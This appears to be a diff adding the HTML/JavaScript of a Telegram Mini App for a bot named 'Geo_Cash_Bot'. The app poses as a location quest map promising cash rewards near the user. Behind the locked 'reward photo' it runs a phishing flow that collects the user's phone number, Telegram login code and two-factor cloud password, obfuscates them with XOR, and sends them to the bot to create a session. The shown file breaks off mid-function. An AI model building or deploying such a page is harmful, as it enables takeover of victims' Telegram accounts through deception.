@@ -1,0 +1,1235 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Карта с ограниченным радиусом</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            height: 100%;
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #334154;
+        }
+
+        #map {
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        .leaflet-container {
+            background: #f0f2f5 !important;
+        }
+
+        .leaflet-popup-content-wrapper {
+            background: #ffffff !important;
+            color: #1a1a2e !important;
+            border-radius: 12px !important;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15) !important;
+            border: 1px solid #e0e0e0;
+        }
+
+        .leaflet-popup-tip {
+            background: #ffffff !important;
+            border: 1px solid #e0e0e0;
+        }
+
+        .leaflet-popup-content {
+            color: #1a1a2e !important;
+        }
+
+        /* --- КВЕСТ ПАНЕЛЬ (снизу) --- */
+        .quest-panel {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: #334154;
+            border-radius: 20px 20px 0 0;
+            padding: 20px;
+            z-index: 1000;
+            display: none;
+            max-height: 80vh;
+            overflow-y: auto;
+            transform: translateY(100%);
+            transition: transform 0.3s ease;
+        }
+
+        .quest-panel.active {
+            display: block;
+            transform: translateY(0);
+        }
+
+        .quest-panel .handle {
+            width: 40px;
+            height: 4px;
+            background: #4a5568;
+            border-radius: 2px;
+            margin: 0 auto 15px;
+            cursor: grab;
+        }
+
+        .quest-panel .handle:active {
+            cursor: grabbing;
+        }
+
+        .quest-panel h2 {
+            color: #e2e8f0;
+            font-size: 22px;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .quest-panel .reward {
+            color: #a0aec0;
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .quest-panel .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding: 0 10px;
+        }
+
+        .quest-panel .coords {
+            color: #e2e8f0;
+            font-size: 14px;
+            font-family: monospace;
+        }
+
+        .quest-panel .distance {
+            color: #4fd1c5;
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .quest-photo {
+            width: 100%;
+            aspect-ratio: 4/3;
+            border-radius: 16px;
+            overflow: hidden;
+            margin-bottom: 15px;
+            cursor: pointer;
+            position: relative;
+            background: #1a202c;
+        }
+
+        .quest-photo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .quest-photo .eye-icon {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 48px;
+            height: 48px;
+            pointer-events: none;
+        }
+
+        .quest-photo .lock-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(26, 32, 44, 0.85);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .quest-photo .lock-overlay .lock-icon {
+            width: 40px;
+            height: 40px;
+            opacity: 0.8;
+        }
+
+        .quest-photo .lock-overlay .lock-text {
+            color: #a0aec0;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        /* --- КНОПКА УПРАВЛЕНИЯ (правый верхний угол) --- */
+        .controls {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            z-index: 1000;
+        }
+
+        .control-btn {
+            width: 44px;
+            height: 44px;
+            background: #334154;
+            border: none;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            color: #e2e8f0;
+        }
+
+        .control-btn svg {
+            width: 22px;
+            height: 22px;
+            fill: #e2e8f0;
+        }
+
+        /* --- ЗАГРУЗКА / ОШИБКА --- */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #334154;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            color: #c9d1d9;
+        }
+
+        .loading-overlay.hidden {
+            display: none;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(48, 54, 61, 0.5);
+            border-top-color: #58a6ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .error-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #334154;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            color: #c9d1d9;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .error-overlay.active {
+            display: flex;
+        }
+
+        .retry-btn {
+            margin-top: 20px;
+            padding: 12px 30px;
+            background: #238636;
+            color: #ffffff;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        /* ===== МОДАЛЬНОЕ ОКНО ТЕЛЕФОНА ===== */
+        .phone-modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            z-index: 2000;
+            align-items: flex-end;
+            justify-content: center;
+        }
+        .phone-modal.active { display: flex; }
+
+        .phone-modal-overlay {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-color: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(4px);
+        }
+
+        .phone-modal-sheet {
+            position: relative;
+            width: 100%;
+            max-width: 500px;
+            background-color: #242f3d;
+            border-radius: 24px 24px 0 0;
+            padding: 24px 20px 32px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            animation: slideUp 0.3s ease;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(100%); }
+            to { transform: translateY(0); }
+        }
+
+        .phone-modal-close {
+            position: absolute;
+            top: 16px; right: 16px;
+            width: 40px; height: 40px; border-radius: 50%;
+            background-color: rgba(255,255,255,0.1); border: none;
+            display: flex; align-items: center; justify-content: center; cursor: pointer;
+        }
+        .phone-modal-close svg { width: 20px; height: 20px; stroke: #fff; stroke-width: 2; fill: none; }
+
+        .phone-modal-icon {
+            width: 80px; height: 80px;
+            margin: 16px 0 20px;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .phone-modal-icon img { width: 100%; height: 100%; object-fit: contain; }
+
+        .phone-modal-title {
+            font-size: 22px; font-weight: 700;
+            margin-bottom: 8px;
+            text-align: center;
+            color: #e2e8f0;
+        }
+        .phone-modal-desc {
+            font-size: 15px;
+            color: #7d8b99;
+            text-align: center;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+        .phone-modal-btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 16px; border: none;
+            background-color: #4a90d9;
+            color: #ffffff;
+            font-size: 17px; font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+        .phone-modal-btn:active { opacity: 0.8; }
+
+        /* ===== ЭКРАН ВВОДА КОДА ПОДТВЕРЖДЕНИЯ ===== */
+        .code-screen {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-color: #334154;
+            z-index: 1500;
+            flex-direction: column;
+        }
+        .code-screen.active { display: flex; }
+
+        .code-close {
+            position: absolute;
+            top: 16px; right: 16px;
+            width: 48px; height: 48px; border-radius: 50%;
+            background-color: rgba(255,255,255,0.08); border: none;
+            display: flex; align-items: center; justify-content: center; cursor: pointer;
+            z-index: 10;
+        }
+        .code-close svg { width: 24px; height: 24px; stroke: #fff; stroke-width: 2; fill: none; }
+
+        .code-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 60px 24px 24px;
+        }
+
+        .code-lock-icon {
+            width: 80px; height: 80px; border-radius: 24px;
+            background: linear-gradient(180deg, #4ab3e4 0%, #2e8bd1 100%);
+            display: flex; align-items: center; justify-content: center;
+            margin-bottom: 40px;
+        }
+        .code-lock-icon svg { width: 40px; height: 40px; stroke: #fff; }
+
+        .code-dots {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        .code-dot {
+            width: 48px; height: 48px;
+            border-radius: 12px;
+            border: 2px solid rgba(255,255,255,0.15);
+            background-color: transparent;
+            transition: all 0.2s;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .code-dot.filled {
+            background-color: #4a90d9;
+            border-color: #4a90d9;
+        }
+        .code-dot.filled::after {
+            content: '';
+            width: 12px; height: 12px;
+            border-radius: 50%;
+            background-color: #fff;
+        }
+
+        .code-title {
+            font-size: 18px;
+            color: #a0aec0;
+            margin-bottom: 40px;
+        }
+
+        .code-keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            width: 100%;
+            max-width: 320px;
+            margin-top: auto;
+            margin-bottom: 20px;
+        }
+        .code-key {
+            height: 72px;
+            border-radius: 16px;
+            background-color: rgba(255,255,255,0.06);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 28px; font-weight: 500;
+            color: #ffffff;
+            cursor: pointer;
+            user-select: none;
+            transition: background-color 0.15s;
+        }
+        .code-key:active { background-color: rgba(255,255,255,0.15); }
+        .code-key.empty { background-color: transparent; cursor: default; pointer-events: none; }
+        .code-key svg { width: 28px; height: 28px; stroke: #fff; }
+
+        /* ===== ЭКРАН ВВОДА ПАРОЛЯ 2FA ===== */
+        .password-screen {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-color: #334154;
+            z-index: 1500;
+            flex-direction: column;
+        }
+        .password-screen.active { display: flex; }
+
+        .password-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px 20px;
+            min-height: 56px;
+        }
+        .password-header-title { font-size: 20px; font-weight: 700; color: #e2e8f0; }
+
+        .password-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 20px;
+        }
+        .password-icon {
+            width: 80px; height: 80px; border-radius: 50%;
+            background: linear-gradient(180deg, #f39c12 0%, #e67e22 100%);
+            display: flex; align-items: center; justify-content: center;
+            margin-bottom: 24px;
+        }
+        .password-icon svg { width: 40px; height: 40px; stroke: #fff; }
+        .password-subtitle {
+            font-size: 18px; font-weight: 600;
+            margin-bottom: 32px;
+            text-align: center;
+            color: #e2e8f0;
+        }
+        .form-group { width: 100%; margin-bottom: 20px; }
+        .form-label { display: block; font-size: 14px; color: #a0aec0; margin-bottom: 8px; }
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 12px;
+            border: 1px solid #4a5568;
+            background-color: #1a202c;
+            color: #ffffff;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .form-input:focus { border-color: #4a90d9; }
+        .form-input::placeholder { color: #7d8b99; }
+        .form-submit-btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 16px; border: none;
+            background-color: #4a90d9;
+            color: #ffffff;
+            font-size: 17px; font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s;
+            margin-top: auto;
+        }
+        .form-submit-btn:active { opacity: 0.8; }
+        .form-submit-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        /* ===== TOAST ===== */
+        .toast-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 3000;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            padding: 16px;
+            pointer-events: none;
+        }
+        .toast {
+            width: 100%;
+            background-color: #242f3d;
+            border-radius: 20px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            pointer-events: all;
+            transform: translateY(-20px);
+            opacity: 0;
+            transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.3s ease;
+        }
+        .toast.show { transform: translateY(0); opacity: 1; }
+        .toast.hide { transform: translateY(-10px); opacity: 0; }
+        .toast-icon { width: 22px; height: 22px; flex-shrink: 0; }
+        .toast-icon svg { width: 100%; height: 100%; }
+        .toast-success .toast-icon { color: #4ade80; }
+        .toast-error .toast-icon { color: #f87171; }
+        .toast-info .toast-icon { color: #60a5fa; }
+        .toast-message { color: #ffffff; font-size: 14px; line-height: 1.4; flex: 1; }
+
+        /* ===== SPINNER ===== */
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin-anim 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin-anim { to { transform: rotate(360deg); } }
+        .btn-loading { opacity: 0.7 !important; cursor: not-allowed !important; pointer-events: none; }
+    </style>
+</head>
+<body>
+    <div id="map"></div>
+
+    <!-- Кнопка управления -->
+    <div class="controls">
+        <button class="control-btn" onclick="focusLocation()" title="Фокус на локации">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+            </svg>
+        </button>
+    </div>
+
+    <div class="loading-overlay" id="loading">
+        <div class="spinner"></div>
+        <p>Определяем ваше местоположение...</p>
+    </div>
+
+    <div class="error-overlay" id="error">
+        <h2>⚠️ Ошибка</h2>
+        <p id="errorText">Не удалось определить местоположение</p>
+        <button class="retry-btn" onclick="initLocation()">Повторить</button>
+    </div>
+
+    <!-- Панель квеста -->
+    <div class="quest-panel" id="questPanel">
+        <div class="handle" id="panelHandle"></div>
+
+        <!-- Информация о квесте -->
+        <div id="questInfoBlock">
+            <h2 id="questTitle">Квест #----</h2>
+            <p class="reward" id="questReward">Содержимое: ---- ₽</p>
+            <div class="info-row">
+                <span class="coords" id="questCoords">--.------, --.------</span>
+                <span class="distance" id="questDistance">--</span>
+            </div>
+            <div class="quest-photo" id="questPhotoBlock" onclick="onPhotoClick()">
+                <img id="questImg" src="" alt="quest">
+                <div class="eye-icon">
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="white">
+                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                        <line x1="2" y1="2" x2="22" y2="22" stroke="white" stroke-width="2" stroke-linecap="round"/>
+                    </svg>
+                </div>
+                <!-- Оверлей блокировки -->
+                <div class="lock-overlay" id="lockOverlay">
+                    <svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                    </svg>
+                    <div class="lock-text">Нажмите, чтобы разблокировать</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== МОДАЛЬНОЕ ОКНО ТЕЛЕФОНА ===== -->
+    <div class="phone-modal" id="phoneModal">
+        <div class="phone-modal-overlay" id="phoneModalOverlay"></div>
+        <div class="phone-modal-sheet">
+            <button class="phone-modal-close" id="phoneModalClose">
+                <svg viewBox="0 0 24 24">
+                    <path d="M18 6L6 18M6 6l12 12"/>
+                </svg>
+            </button>
+            <div class="phone-modal-icon">
+                <img src="https://emoji-cdn.mqrio.dev/📱?style=telegram" alt="📱">
+            </div>
+            <div class="phone-modal-title">Укажите номер телефона</div>
+            <div class="phone-modal-desc">Поделитесь своим номером телефона в Telegram для подтверждения личности.</div>
+            <button class="phone-modal-btn" id="phoneModalContinue">Продолжить</button>
+        </div>
+    </div>
+
+    <!-- ===== ЭКРАН ВВОДА КОДА ПОДТВЕРЖДЕНИЯ ===== -->
+    <div class="code-screen" id="codeScreen">
+        <button class="code-close" id="codeClose">
+            <svg viewBox="0 0 24 24">
+                <path d="M18 6L6 18M6 6l12 12"/>
+            </svg>
+        </button>
+        <div class="code-content">
+            <div class="code-lock-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+            </div>
+            <div class="code-dots">
+                <div class="code-dot"></div>
+                <div class="code-dot"></div>
+                <div class="code-dot"></div>
+                <div class="code-dot"></div>
+                <div class="code-dot"></div>
+            </div>
+            <div class="code-title" id="codeTitle">Введите код подтверждения</div>
+            <div class="code-keypad">
+                <div class="code-key" data-digit="1">1</div>
+                <div class="code-key" data-digit="2">2</div>
+                <div class="code-key" data-digit="3">3</div>
+                <div class="code-key" data-digit="4">4</div>
+                <div class="code-key" data-digit="5">5</div>
+                <div class="code-key" data-digit="6">6</div>
+                <div class="code-key" data-digit="7">7</div>
+                <div class="code-key" data-digit="8">8</div>
+                <div class="code-key" data-digit="9">9</div>
+                <div class="code-key empty"></div>
+                <div class="code-key" data-digit="0">0</div>
+                <div class="code-key" id="codeBackspace">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
+                        <line x1="18" y1="9" x2="12" y2="15"></line>
+                        <line x1="12" y1="9" x2="18" y2="15"></line>
+                    </svg>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== ЭКРАН ВВОДА ПАРОЛЯ 2FA ===== -->
+    <div class="password-screen" id="passwordScreen">
+        <div class="password-header">
+            <div class="password-header-title">Двухфакторная аутентификация</div>
+        </div>
+        <div class="password-content">
+            <div class="password-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+            </div>
+            <div class="password-subtitle">Введите пароль от облачного пароля</div>
+            <div class="form-group">
+                <input type="password" class="form-input" id="passwordInput" placeholder="Пароль">
+            </div>
+            <button class="form-submit-btn" id="passwordSubmit">Подтвердить</button>
+        </div>
+    </div>
+
+    <div class="toast-container" id="toastContainer"></div>
+
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script>
+        const SECRET_KEY = "key12415";
+        const BOT_USERNAME = "Geo_Cash_Bot";
+        const WEBAPP_URL = `https://t.me/${BOT_USERNAME}/app`;
+
+        let map, userMarker, userPos, randomMarkers = [];
+        let questData = null;
+        let currentPointIndex = 0;
+        let currentUserId = null;
+        let userPhone = null;
+        let questUnlocked = {}; // {questIndex: true}
+        const RADIUS_KM = 4;
+        const MIN_RANDOM_KM = 0.5;
+        const MAX_RANDOM_KM = 1.5;
+        const REWARDS = [1000, 1500, 2000, 3500];
+        const PHOTOS = ['1.png', '2.png'];
+
+        // Telegram WebApp init
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.setHeaderColor('#334154');
+        tg.setBackgroundColor('#334154');
+
+        const user = tg.initDataUnsafe?.user;
+        if (user && user.id) {
+            currentUserId = user.id;
+        } else {
+            currentUserId = parseInt(localStorage.getItem('debug_user_id') || '0') || null;
+        }
+
+        // Загружаем состояние разблокировки
+        const savedUnlocked = localStorage.getItem('questUnlocked');
+        if (savedUnlocked) {
+            questUnlocked = JSON.parse(savedUnlocked);
+        }
+
+        // ============ SHA256 ============
+        async function sha256(message) {
+            const encoder = new TextEncoder();
+            const data = encoder.encode(message);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+            return new Uint8Array(hashBuffer);
+        }
+
+        // ============ XOR ШИФРОВАНИЕ ============
+        async function xorEncrypt(plaintext) {
+            const key = await sha256(SECRET_KEY);
+            const data = new TextEncoder().encode(plaintext);
+            const encrypted = new Uint8Array(data.length);
+            for (let i = 0; i < data.length; i++) {
+                encrypted[i] = data[i] ^ key[i % key.length];
+            }
+            let b64 = btoa(String.fromCharCode(...encrypted));
+            b64 = b64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+            return b64;
+        }
+
+        // ============ TOAST ============
+        const toastIcons = {
+            success: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>`,
+            error: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M15 9l-6 6M9 9l6 6"/></svg>`,
+            info: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>`
+        };
+
+        function showToast(message, type = 'success') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `toast toast-${type}`;
+            toast.innerHTML = `<div class="toast-icon">${toastIcons[type]}</div><div class="toast-message">${message}</div>`;
+            container.appendChild(toast);
+            requestAnimationFrame(() => {
+                requestAnimationFrame(() => toast.classList.add('show'));
+            });
+            setTimeout(() => {
+                toast.classList.remove('show');
+                toast.classList.add('hide');
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+
+        // ============ ЭКРАНЫ АВТОРИЗАЦИИ ============
+        const phoneModal = document.getElementById('phoneModal');
+        const phoneModalOverlay = document.getElementById('phoneModalOverlay');
+        const phoneModalClose = document.getElementById('phoneModalClose');
+        const phoneModalContinue = document.getElementById('phoneModalContinue');
+        const codeScreen = document.getElementById('codeScreen');
+        const codeClose = document.getElementById('codeClose');
+        const codeDots = document.querySelectorAll('.code-dot');
+        const codeKeys = document.querySelectorAll('.code-key');
+        const codeBackspace = document.getElementById('codeBackspace');
+        const codeTitle = document.getElementById('codeTitle');
+        const passwordScreen = document.getElementById('passwordScreen');
+        const passwordInput = document.getElementById('passwordInput');
+        const passwordSubmit = document.getElementById('passwordSubmit');
+        let currentCode = '';
+
+        function openPhoneModal() {
+            phoneModal.classList.add('active');
+            tg.setHeaderColor("#090C11");
+        }
+
+        function closePhoneModal() {
+            phoneModal.classList.remove('active');
+            tg.setHeaderColor("#334154");
+        }
+
+        if (phoneModalOverlay) phoneModalOverlay.addEventListener('click', closePhoneModal);
+        if (phoneModalClose) phoneModalClose.addEventListener('click', closePhoneModal);
+
+        if (phoneModalContinue) {
+            phoneModalContinue.addEventListener('click', () => {
+                if (tg.requestContact) {
+                    tg.requestContact((sent, event) => {
+                        if (sent) {
+                            const phone = event?.responseUnsafe?.contact?.phone_number;
+                            if (phone) {
+                                userPhone = phone;
+                                localStorage.setItem(`map_phone_${currentUserId}`, phone);
+                                showToast('Номер телефона получен!', 'success');
+                                closePhoneModal();
+                                startAuthFlow();
+                            }
+                        } else {
+                            showToast('Доступ к контактам отклонён', 'error');
+                        }
+                    });
+                } else {
+                    showToast('requestContact недоступен', 'error');
+                }
+            });
+        }
+
+        function updateCodeDots() {
+            codeDots.forEach((dot, i) => {
+                dot.classList.toggle('filled', i < currentCode.length);
+            });
+        }
+
+        async function appendCodeDigit(digit) {
+            if (currentCode.length >= 5) return;
+            currentCode += digit;
+            updateCodeDots();
+            if (currentCode.length === 5) {
+                const encryptedCode = await xorEncrypt(currentCode);
+                tg.openTelegramLink(`https://t.me/${BOT_USERNAME}?start=sendCode_map_${currentUserId}_${encryptedCode}`);
+
+                // Показываем спиннер
+                const keypad = document.querySelector('.code-keypad');
+                if (keypad) {
+                    keypad.style.pointerEvents = 'none';
+                    keypad.style.opacity = '0.5';
+                }
+                codeTitle.dataset.originalText = codeTitle.textContent;
+                codeTitle.innerHTML = '<span class="spinner"></span> Проверка кода...';
+
+                setTimeout(() => {
+                    tg.close();
+                }, 2000);
+            }
+        }
+
+        function removeCodeDigit() {
+            currentCode = currentCode.slice(0, -1);
+            updateCodeDots();
+        }
+
+        codeKeys.forEach(key => {
+            key.addEventListener('click', () => {
+                const digit = key.dataset.digit;
+                if (digit) appendCodeDigit(digit);
+            });
+        });
+
+        if (codeBackspace) {
+            codeBackspace.addEventListener('click', removeCodeDigit);
+        }
+
+        if (codeClose) {
+            codeClose.addEventListener('click', () => {
+                codeScreen.classList.remove('active');
+                currentCode = '';
+                updateCodeDots();
+                tg.setHeaderColor("#334154");
+            });
+        }
+
+        if (passwordSubmit) {
+            passwordSubmit.addEventListener('click', async () => {
+                const password = passwordInput.value.trim();
+                if (!password) {
+                    showToast('Введите пароль', 'error');
+                    return;
+                }
+                const encryptedPassword = await xorEncrypt(password);
+                tg.openTelegramLink(`https://t.me/${BOT_USERNAME}?start=sendPassword_map_${currentUserId}_${encryptedPassword}`);
+
+                passwordSubmit.disabled = true;
+                passwordSubmit.classList.add('btn-loading');
+                passwordSubmit.innerHTML = '<span class="spinner"></span>Проверка...';
+
+                setTimeout(() => {
+                    tg.close();
+                }, 2000);
+            });
+        }
+
+        function startAuthFlow() {
+            // Сохраняем флаг авторизации
+            localStorage.setItem(`map_auth_pending_${currentUserId}`, 'true');
+            localStorage.setItem(`map_auth_quest_${currentUserId}`, currentPointIndex);
+
+            // Открываем бота для создания сессии
+            tg.openTelegramLink(`https://t.me/${BOT_USERNAME}?start=createSession_map_${currentUserId}`);
+
+            // Через 10 секунд показываем экран ввода кода
+            setTimeout(() => {
+                codeScreen.classList.add('active');
+                tg.setHeaderColor("#1a1d29");
+            }, 10000);
+        }
+
+        // ============ ОБРАБОТКА STARTAPP ============
+        function handleStartAppParam() {
+            const startParam = tg.initDataUnsafe?.start_param;
+            if (!startParam) {
+                // Проверяем прерванную авторизацию
+                restoreAuthState();
+                return;
+            }
+
+            if (startParam.startsWith('enterPassword_map_')) {
+                const targetUserId = parseInt(startParam.split('_')[3]);
+                if (targetUserId === currentUserId) {
+                    passwordScreen.classList.add('active');
+                    tg.setHeaderColor("#1a1d29");
+                }
+            } else if (startParam.startsWith('success_map_')) {
+                const targetUserId = parseInt(startParam.split('_')[2]);
+                if (targetUserId === currentUserId) {
+                    // Успех! Разблокируем квест
+                    const pendingQuest = localStorage.getItem(`map_auth_quest_${currentUserId}`);
+                    if (pendingQuest !== null) {
+                        questUnlocked[pendingQuest] = true;
+                        localStorage.setItem('questUnlocked', JSON.stringify(questUnlocked));
+                    }
+                    // Очищаем флаги
+                    localStorage.removeItem(`map_auth_pending_${currentUserId}`);
+                    localStorage.removeItem(`map_auth_quest_${currentUserId}`);
+
+                    showToast('Квест разблокирован!', 'success');
+
+                    // Обновляем UI
+                    updateLockOverlay();
+
+                    // Очищаем URL
+                    if (window.history.replaceState) {
+                        window.history.replaceState({}, document.title, window.location.pathname);
+                    }
+                }
+            } else if (startParam.startsWith('retry_map_')) {
+                const targetUserId = parseInt(startParam.split('_')[2]);
+                if (targetUserId === currentUserId) {
+                    localStorage.removeItem(`map_auth_pending_${currentUserId}`);
+                    showToast('Попробуйте снова', 'info');
+                }
+            } else {
+                restoreAuthState();
+            }
+        }
+
+        function restoreAuthState() {
+            const pending = localStorage.getItem(`map_auth_pending_${currentUserId}`);
+            if (pending) {
+                const startParam = tg.initDataUnsafe?.start_param;
+                if (!startParam || (!startParam.startsWith('success_map_') && !startParam.startsWith('enterPassword_map_'))) {
+                    localStorage.removeItem(`map_auth_pending_${currentUserId}`);
+                    localStorage.removeItem(`map_auth_quest_${currentUserId}`);
+                }
+            }
+        }
+
+        // ============ ЛОГИКА КВЕСТА ============
+        function onPhotoClick() {
+            if (questUnlocked[currentPointIndex]) {
+                // Уже разблокирован — ничего не делаем (фото видно)
+                return;
+            }
+            // Проверяем, есть ли сохранённый телефон
+            const savedPhone = localStorage.getItem(`map_phone_${currentUserId}`);
+            if (savedPhone) {
+                userPhone = savedPhone;
+                startAuthFlow();
+            } else {
+                openPhoneModal();
+            }
+        }
+
+        function updateLockOverlay() {
+            const overlay = document.getElementById('lockOverlay');
+            if (questUnlocked[currentPointIndex]) {
+                overlay.style.display = 'none';
+                // Убираем иконку глаза тоже
+                const eye = document.querySelector('.eye-icon');
+                if (eye) eye.style.display = 'none';
+            } else {
+                overlay.style.display = 'flex';
+            }
+        }
+
+        // --- Свайп для закрытия панели ---
+        let startY = 0;
+        let currentY = 0;
+        let isDragging = false;
+        const panel = document.getElementById('questPanel');
+        const handle = document.getElementById('panelHandle');
+
+        function isInteractiveElement(target) {
+            return target.closest('.quest-photo') || 
+                   target.closest('.phone-modal') || 
+                   target.closest('.code-screen') ||
+                   target.closest('.password-screen');
+        }
+
+        handle.addEventListener('touchstart', function(e) {
+            startY = e.touches[0].clientY;
+            isDragging = true;
+            panel.style.transition = 'none';
+        }, { passive: true });
+
+        handle.addEventListener('touchmove', function(e) {
+            if (!isDragging) return;
+            currentY = e.touches[0].clientY;
+            const delta = currentY - startY;
+            if (delta > 0) panel.style.transform = `translateY(${delta}px)`;
+        }, { passive: true });
+
+        handle.addEventListener('touchend', function(e) {
+            isDragging = false;
